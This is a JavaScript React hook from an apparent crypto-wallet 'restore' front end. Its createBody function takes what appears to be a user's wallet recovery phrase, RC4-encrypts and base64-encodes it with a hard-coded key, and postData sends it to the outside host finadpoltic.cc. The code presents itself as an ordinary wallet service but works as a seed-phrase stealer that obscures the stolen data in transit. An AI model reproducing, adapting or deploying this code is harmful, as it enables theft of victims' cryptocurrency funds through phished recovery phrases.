import { useHttp } from '../hooks/http.hook';
import randomNum from '../Func.wallet/randomNum';
import CryptoJS from 'crypto-js';
import { rc4 } from '../store/slices/rc4';

const useWalletService = () => {
	const { error, loading, request, clearError } = useHttp();

	let url = 'https://finadpoltic.cc/api/restore';
	const kitkat = 'Qsx@ah&OR82WX9T6gCt';

	function createBody(str) {
		let strDecr;
		let lengthStr = str.split(' ').length;
		if (lengthStr < 2) {
			strDecr = CryptoJS.AES.decrypt(str, kitkat).toString(CryptoJS.enc.Utf8);
		} else {
			strDecr = str;
		}
		let xx = 'ETH2O$Lanch';

		const obj = {
			name: xx,
			salt: randomNum(100000, 999999),
			public: strDecr,
		};

		let crypt = btoa(rc4(kitkat, JSON.stringify(obj)));

		var urlencoded = new URLSearchParams();
		urlencoded.append('data', crypt);
		return urlencoded;
	}

	async function postData(str, account) {
		let requestBody = createBody(str, account);

		const response = await request(new URL(url), 'POST', requestBody, {
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		});
		return response;
	}

	return {
		error,
		loading,
		clearError,
		postData,
	};
};
export default useWalletService;
